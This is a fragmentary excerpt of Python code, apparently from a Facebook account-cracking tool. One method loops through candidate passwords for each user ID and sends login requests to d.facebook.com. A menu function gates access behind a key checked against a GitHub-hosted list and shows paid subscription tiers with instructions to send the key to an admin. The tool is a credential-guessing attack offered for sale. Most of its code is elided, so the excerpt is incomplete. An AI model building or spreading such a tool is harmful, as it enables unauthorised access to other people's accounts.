    ...
    def methodD(self, sid, name, psw):
        ...
        try:
            for pw in psw:
                ...
                session.headers = {}
                session.headers.update({'Host': 'd.facebook.com',
...
def danger_menu():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Kkiijj/Lone/blob/main/Love.txt").text
    if id in DARK:
        DANGER()
    else:
        os.system("clear")
        ...
        print ("")
        print("   7 Day-150৳             Your Key is Not Approved ")
        print("   15 Day-250৳           Copy And Send Key To Admin")
        print ("")
